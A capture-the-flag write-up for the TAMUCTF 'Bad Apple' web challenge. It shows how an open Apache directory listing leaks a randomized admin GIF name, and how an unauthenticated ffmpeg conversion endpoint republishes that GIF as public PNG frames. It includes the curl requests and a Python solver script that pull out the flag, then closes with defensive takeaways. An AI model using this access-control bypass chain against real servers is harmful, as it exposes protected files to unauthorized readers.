@@ -1,0 +1,387 @@
+---
+title: 'Texas A&M University 2026 - Bad Apple'
+description: 'Using an open upload directory listing and an unauthenticated ffmpeg conversion endpoint to turn a protected admin GIF into public frames and recover the flag.'
+date: 2026-03-21
+category: 'texas-am-university-2026'
+discipline: 'web-exploit'
+authors: ['abdieeuh']
+draft: false
+---
+
+> Note: I solved this challenge with LLM
+
+Bad Apple was a very clean TAMUCTF web challenge once the attachment was inspected. The live service looked deceptively small from the outside, but the source made the intended chain obvious. The full solve path was:
+
+- open Apache directory indexing on `/browse`
+- filename disclosure of a randomized admin GIF
+- unauthenticated `/convert` on arbitrary uploaded files
+- public frame exposure through `/get_frames` and `/static/frames/...`
+- visual/OCR recovery of the scrolling flag text
+
+Even though the challenge initially felt like it wanted path traversal or ffmpeg weirdness, the real bug chain was much simpler and more deterministic than that.
+
+## Challenge Information
+
+- Category: Web Exploitation
+- Challenge: Bad Apple
+- Event: TAMUCTF (filed here under Texas A&M University 2026)
+- Difficulty: Medium
+- Attachments / source code: Flask app, Apache config, Dockerfile
+- Goal: recover the flag from a protected admin GIF without valid admin credentials
+
+## Initial Analysis
+
+The attachment was tiny:
+
+- `wsgi_app.py`
+- `httpd-append.conf`
+- `Dockerfile`
+
+That already suggested the challenge would be about deployment and routing mistakes, not a huge application bug surface.
+
+The Flask app uses:
+
+```python
+app = Flask(__name__, template_folder=os.path.join(BASE_DIR, 'templates'),  static_folder='/srv/http/static')
+
+UPLOAD_FOLDER = '/srv/http/uploads'
+FRAMES_BASE = '/srv/http/static/frames'
+```
+
+So there are two important filesystem roots:
+
+- uploaded source files in `/srv/http/uploads`
+- rendered frame output in `/srv/http/static/frames`
+
+The main user functionality is:
+
+- upload a GIF through `/upload`
+- convert that GIF into frames with ffmpeg
+- list frames through `/get_frames`
+- render them from `/static/frames/...`
+
+The first critical clue was the extra route:
+
+```python
+@app.route('/convert')
+def convert():
+    user_id = request.args.get('user_id', 'anonymous')
+    filename = request.args.get('filename', '')
+
+    input_path = os.path.join(app.config['UPLOAD_FOLDER'], secure_filename(user_id), filename)
+    if not os.path.exists(input_path):
+        return "File not found", 404
+
+    safe_name = os.path.splitext(os.path.basename(filename))[0]
+    output_dir = os.path.join(FRAMES_BASE, user_id, safe_name)
+    os.makedirs(output_dir, exist_ok=True)
+
+    try:
+        frame_count = extract_frames(input_path, output_dir, safe_name)
+        return redirect(url_for('index', view=safe_name, user_id=user_id))
+    except Exception as e:
+        return f"Error processing file: {str(e)}", 500
+```
+
+This route takes a user-controlled `user_id` and `filename`, locates an uploaded file, and runs the same ffmpeg pipeline used for normal uploads. There is no authentication check at all.
+
+That still would not be enough unless we could discover a valid target file name.
+
+## Recon / Enumeration
+
+The Apache configuration was the real giveaway:
+
+```apache
+Alias /browse /srv/http/uploads
+<Directory /srv/http/uploads>
+    Options +Indexes
+    DirectoryIndex disabled
+    IndexOptions FancyIndexing FoldersFirst NameWidth=* DescriptionWidth=* ShowForbidden
+    AllowOverride None
+    Require all granted
+
+    <FilesMatch "\.gif$">
+        AuthType Basic
+        AuthName "Admin Area"
+        AuthUserFile /srv/http/.htpasswd
+        Require valid-user
+    </FilesMatch>
+</Directory>
+```
+
+This means:
+
+- `/browse` exposes the upload directory structure
+- directory listings are enabled
+- direct access to `.gif` files requires Basic Auth
+- directory listing itself does not
+
+So even if the protected admin GIF cannot be downloaded directly, its name can still be leaked from the listing.
+
+The Docker startup command explains why that matters:
+
+```dockerfile
+CMD ["sh", "-c", "HEX=$(openssl rand -hex 16) && mv /srv/http/uploads/admin/flag.gif /srv/http/uploads/admin/$HEX-flag.gif && echo $HEX > /srv/http/.flag_secret && httpd -DFOREGROUND"]
+```
+
+At container start:
+
+- `flag.gif` is renamed to a random `<hex>-flag.gif`
+- that random name is not otherwise disclosed by the app
+
+So the intended defense is "you do not know the admin filename". But `/browse/admin/` destroys that assumption immediately.
+
+## Vulnerability Discovery
+
+The full exploit depends on three design mistakes that chain together perfectly.
+
+### 1. Open directory indexing leaks the randomized admin filename
+
+Because `/browse/admin/` is world-readable, an unauthenticated user can enumerate the admin upload directory and see:
+
+```html
+<a href="1be0aebf801ff68a176f188987c3eae9-flag.gif">1be0aebf801ff68a176f188987c3eae9-flag.gif</a>
+```
+
+This bypasses the randomization from the Docker entrypoint without ever needing to know `.flag_secret`.
+
+Important nuance:
+
+- the `.gif` file itself is still protected by Basic Auth
+- only the filename is exposed
+
+That is enough because of the next bug.
+
+### 2. `/convert` will process arbitrary uploaded files without authentication
+
+The route:
+
+```python
+input_path = os.path.join(app.config['UPLOAD_FOLDER'], secure_filename(user_id), filename)
+if not os.path.exists(input_path):
+    return "File not found", 404
+```
+
+does not verify ownership and does not require login. If the file exists on disk, it gets processed.
+
+That means an attacker can simply call:
+
+```text
+/convert?user_id=admin&filename=<leaked-random-name>.gif
+```
+
+and the server will run ffmpeg against the protected admin upload on our behalf.
+
+The important point is that the route never tries to serve the original `.gif`. It only reads it locally and emits derived files.
+
+### 3. The rendered PNG frames are fully public
+
+The conversion output is written under:
+
+```python
+output_dir = os.path.join(FRAMES_BASE, user_id, safe_name)
+```
+
+and frame enumeration is exposed by:
+
+```python
+@app.route('/get_frames')
+def get_frames():
+    user_id = request.args.get('user_id', 'anonymous')
+    gif_name = request.args.get('gif_name', '')
+
+    frames_dir = os.path.join(FRAMES_BASE, user_id, gif_name)
+
+    if not os.path.exists(frames_dir):
+        return jsonify({'error': 'GIF not found'}), 404
+
+    frames = sorted([f for f in os.listdir(frames_dir) if f.startswith('frame_') and f.endswith('.png')])
+
+    return jsonify(frames)
+```
+
+and then served directly from the public static tree:
+
+```text
+/static/frames/<user_id>/<gif_name>/frame_XXXX.png
+```
+
+So the authorization boundary only exists for the original `.gif`, not for the converted artifacts. Once conversion happens, the contents become public.
+
+## Exploitation
+
+The live solve was very short once the source was known.
+
+### Step 1: Enumerate the admin upload directory
+
+Request:
+
+```http
+GET /browse/admin/ HTTP/1.1
+Host: bad-apple.tamuctf.com
+```
+
+The response included:
+
+```html
+<a href="1be0aebf801ff68a176f188987c3eae9-flag.gif">1be0aebf801ff68a176f188987c3eae9-flag.gif</a>
+```
+
+So the randomized filename was:
+
+```text
+1be0aebf801ff68a176f188987c3eae9-flag.gif
+```
+
+### Step 2: Trigger conversion of the protected admin GIF
+
+Request:
+
+```http
+GET /convert?user_id=admin&filename=1be0aebf801ff68a176f188987c3eae9-flag.gif HTTP/1.1
+Host: bad-apple.tamuctf.com
+```
+
+This causes the server to run ffmpeg and write the output frames to:
+
+```text
+/srv/http/static/frames/admin/1be0aebf801ff68a176f188987c3eae9-flag/
+```
+
+No Basic Auth is required for this step.
+
+### Step 3: Enumerate the generated frames
+
+Request:
+
+```http
+GET /get_frames?user_id=admin&gif_name=1be0aebf801ff68a176f188987c3eae9-flag HTTP/1.1
+Host: bad-apple.tamuctf.com
+```
+
+This returned a long JSON list:
+
+```json
+["frame_0001.png","frame_0002.png", ... ,"frame_0155.png"]
+```
+
+So the conversion succeeded and made the flag GIF contents publicly readable as PNGs.
+
+### Step 4: Read the frames and reconstruct the scrolling text
+
+Individual frames were fetched from:
+
+```text
+/static/frames/admin/1be0aebf801ff68a176f188987c3eae9-flag/frame_XXXX.png
+```
+
+The flag was not stored as a single static image. It was scrolling across the frame sequence, so the easiest recovery method was:
+
+- fetch a few overlapping frames
+- inspect them visually
+- use OCR as a helper, not as the ground truth
+
+Representative frames looked like this:
+
+- `frame_0032.png` showed `gigem{`
+- `frame_0068.png` showed `3z_t0h0`
+- `frame_0096.png` showed `0u_fl4g`
+- `frame_0124.png` showed `g_r1t3}`
+
+Combining the overlaps yields the flag.
+
+## Request Examples
+
+Leak the admin filename:
+
+```bash
+curl -sS https://bad-apple.tamuctf.com/browse/admin/
+```
+
+Convert the protected admin GIF into public frames:
+
+```bash
+curl -sS 'https://bad-apple.tamuctf.com/convert?user_id=admin&filename=1be0aebf801ff68a176f188987c3eae9-flag.gif'
+```
+
+List the generated frames:
+
+```bash
+curl -sS 'https://bad-apple.tamuctf.com/get_frames?user_id=admin&gif_name=1be0aebf801ff68a176f188987c3eae9-flag'
+```
+
+Fetch a specific frame:
+
+```bash
+curl -sS 'https://bad-apple.tamuctf.com/static/frames/admin/1be0aebf801ff68a176f188987c3eae9-flag/frame_0032.png' -o frame_0032.png
+```
+
+## Minimal Solver
+
+I did not need a complicated exploit script. A small helper that leaks the filename, triggers conversion, and downloads selected frames is enough:
+
+```python
+#!/usr/bin/env python3
+import re
+import requests
+
+BASE = "https://bad-apple.tamuctf.com"
+
+s = requests.Session()
+
+listing = s.get(f"{BASE}/browse/admin/", timeout=10).text
+m = re.search(r'([0-9a-f]{32}-flag\.gif)', listing)
+if not m:
+    raise SystemExit("admin gif name not found")
+
+filename = m.group(1)
+gif_name = filename[:-4]
+print("[+] leaked filename:", filename)
+
+s.get(
+    f"{BASE}/convert",
+    params={"user_id": "admin", "filename": filename},
+    timeout=20,
+)
+
+frames = s.get(
+    f"{BASE}/get_frames",
+    params={"user_id": "admin", "gif_name": gif_name},
+    timeout=10,
+).json()
+
+print(f"[+] frame count: {len(frames)}")
+
+for name in ["frame_0032.png", "frame_0068.png", "frame_0096.png", "frame_0124.png"]:
+    r = s.get(f"{BASE}/static/frames/admin/{gif_name}/{name}", timeout=10)
+    open(name, "wb").write(r.content)
+    print("[+] saved", name)
+```
+
+At that point the rest is just reading the scrolling text from the downloaded frames.
+
+## Getting the Flag
+
+The final flag recovered from the rendered admin frames was:
+
+```text
+gigem{3z_t0h0u_fl4g_r1t3}
+```
+
+## Key Takeaways
+
+- Protecting only the original file is useless if you also expose a server-side transform that re-publishes its contents.
+- Randomizing filenames does not help when directory indexing leaks them anyway.
+- "Read-only" helper routes like `/convert` are often more dangerous than the primary upload route because they bypass the original access-control assumptions.
+- When a challenge uses ffmpeg or image pipelines, check whether derivative artifacts land in a weaker trust boundary than the source asset.
+
+## Final Thoughts
+
+Bad Apple was a nice example of a deployment-level web bug chain. The Flask code itself was small and mostly straightforward. The actual issue came from the interaction between:
+
+- Apache directory indexing
+- Apache file-level auth on only one extension
+- an unauthenticated conversion endpoint
+- public static output
+
+Once those pieces were lined up, the solve path was completely deterministic: leak the admin filename, convert the protected GIF, and read the public frames.
